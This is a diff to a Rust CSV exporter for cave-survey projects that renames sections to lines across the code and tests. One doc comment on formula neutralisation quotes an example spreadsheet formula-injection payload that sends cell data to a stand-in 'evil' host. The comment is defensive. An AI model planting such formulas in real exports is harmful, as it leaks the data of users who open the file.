@@ -16,19 +16,19 @@ fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
     // Write header
     writeln!(
         file,
-        "section_id,section_name,shot_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment"
+        "line_id,line_name,shot_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment"
     )?;
 
     // Write shots
-    for section in &project.sections {
-        let section_name = section.name.as_deref().unwrap_or("");
+    for line in &project.lines {
+        let line_name = line.name.as_deref().unwrap_or("");
 
-        for shot in &section.shots {
+        for shot in &line.shots {
             writeln!(
                 file,
                 "{},{},{},{:.2},{:.1},{:.1},{:.2},{:.2},{},{},{},{},{},{}",
-                section.id,
-                escape_csv(section_name),
+                line.id,
+                escape_csv(line_name),
                 shot.id,
                 shot.length,
                 shot.azimuth_in,
@@ -58,7 +58,7 @@ fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
 /// 2. **Formula neutralisation.** Excel, LibreOffice and Sheets evaluate a cell
 ///    whose text begins with `=`, `+`, `-`, `@`, tab or CR - quoting does NOT
 ///    stop this, the formula is parsed after the CSV layer is stripped. The two
-///    fields that reach here (`section_name`, `shot.comment`) are attacker
+///    fields that reach here (`line_name`, `shot.comment`) are attacker
 ///    controlled: they come verbatim out of an imported `.tml` / `.dat` /
 ///    `.srv`, so a comment of `=HYPERLINK("http://evil/"&A1,"ok")` would run on
 ///    open. A leading apostrophe is the standard mitigation (OWASP).
@@ -90,13 +90,13 @@ fn format_optional(value: Option<f64>) -> String {
 #[expect(clippy::unwrap_used)]
 mod tests {
     use super::*;
-    use crate::models::{SectionData, ShotData};
+    use crate::models::{LineData, ShotData};
     use tempfile::NamedTempFile;
 
     #[test]
     fn test_export_csv() {
         let mut project = Project::new("Test".to_string(), None);
-        project.add_section(SectionData {
+        project.add_line(LineData {
             name: Some("Main".to_string()),
             surveyor: None,
             date: None,
@@ -118,7 +118,7 @@ mod tests {
         assert!(result.is_ok());
 
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        assert!(contents.contains("section_id,section_name"));
+        assert!(contents.contains("line_id,line_name"));
         assert!(contents.contains("Main"));
         assert!(contents.contains("10.00"));
     }
@@ -134,7 +134,7 @@ mod tests {
 
     #[test]
     fn test_escape_csv_neutralises_spreadsheet_formulas() {
-        // A comment or section name comes verbatim out of an imported survey
+        // A comment or line name comes verbatim out of an imported survey
         // file, so it is attacker-controlled. Quoting alone does NOT stop a
         // formula - Excel parses the cell text after the CSV layer is stripped.
         assert_eq!(
@@ -214,15 +214,15 @@ mod tests {
         assert!(result.is_ok(), "empty project CSV export should succeed");
         let contents = std::fs::read_to_string(file.path()).unwrap();
         // Should have header row but no data rows
-        assert!(contents.contains("section_id,section_name"));
-        let lines: Vec<&str> = contents.lines().collect();
-        assert_eq!(lines.len(), 1, "only header row expected for empty project");
+        assert!(contents.contains("line_id,line_name"));
+        let rows: Vec<&str> = contents.lines().collect();
+        assert_eq!(rows.len(), 1, "only header row expected for empty project");
     }
 
     #[test]
-    fn test_export_csv_unicode_section_name() {
+    fn test_export_csv_unicode_line_name() {
         let mut project = Project::new("Unicode".to_string(), None);
-        project.add_section(SectionData {
+        project.add_line(LineData {
             name: Some("Grotte de l'Ours 🐻".to_string()),
             surveyor: Some("José García".to_string()),
             date: None,
@@ -243,10 +243,10 @@ mod tests {
         let result = export_csv(&project, file.path());
         assert!(result.is_ok());
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        // CSV only exports section_name, not surveyor - verify Unicode section name
+        // CSV only exports line_name, not surveyor - verify Unicode line name
         assert!(
             contents.contains("Grotte de l'Ours"),
-            "Unicode section name should be in CSV"
+            "Unicode line name should be in CSV"
         );
     }
 
@@ -256,10 +256,10 @@ mod tests {
     }
 
     #[test]
-    fn test_export_csv_multiple_sections() {
+    fn test_export_csv_multiple_lines() {
         let mut project = Project::new("Multi".to_string(), None);
         for i in 0..3 {
-            project.add_section(SectionData {
+            project.add_line(LineData {
                 name: Some(format!("Sec{i}")),
                 color: "#ff0000".to_string(),
                 shots: vec![ShotData {
@@ -278,7 +278,7 @@ mod tests {
         let result = export_csv(&project, file.path());
         assert!(result.is_ok());
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        let data_lines = contents.lines().skip(1).count();
-        assert_eq!(data_lines, 3, "should have one row per shot");
+        let data_rows = contents.lines().skip(1).count();
+        assert_eq!(data_rows, 3, "should have one row per shot");
     }
 }
